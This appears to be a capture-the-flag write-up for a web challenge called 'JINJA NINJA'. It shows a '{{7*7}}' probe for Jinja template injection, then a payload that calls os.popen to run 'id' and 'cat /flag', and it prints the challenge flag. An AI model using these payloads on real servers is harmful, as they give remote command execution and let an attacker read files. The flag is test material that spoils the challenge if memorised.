# JINJA NINJA
> WTF is a JINJA? Aint it supposed to be NINJA RAHHHHHHHH

Author: anarchistx


## About the Challenge
This challenge gives a website like this

## How to Solve?

hmm... this challenge named JINJA NINJA. i feel like this is a jinja exploit. first, i try with '{{7*7}}' to verify this is clearly jinja exploit.

<img width="1850" height="1006" alt="Screenshot from 2025-09-15 21-07-34" src="https://github.com/user-attachments/assets/aca6839a-e7df-41a9-a303-fca43a993f9c" />

Yup. its execute with output 49. then i search on internet and found this command

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

from this website https://onsecurity.io/article/server-side-template-injection-with-jinja2/ 
since there said flag hidden at /flag. then, i modify to cat /flag like this

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
```

<img width="1850" height="1006" alt="image" src="https://github.com/user-attachments/assets/16ee7a56-5f36-4946-a0c7-bda8c062621f" />

Boom. we got the flag

## Flag
```
HCS{n0w_y0u_h4v3_l34rn3d_ab0ut_SST1_thr0ugh_th1s_ch4ll3ng3_c0ngratzzzzzz_n1nj4_w4r10r_b913cf89-75cf-4e32-bd28-bc6b278b0daf}
```

## Reference

https://onsecurity.io/article/server-side-template-injection-with-jinja2/
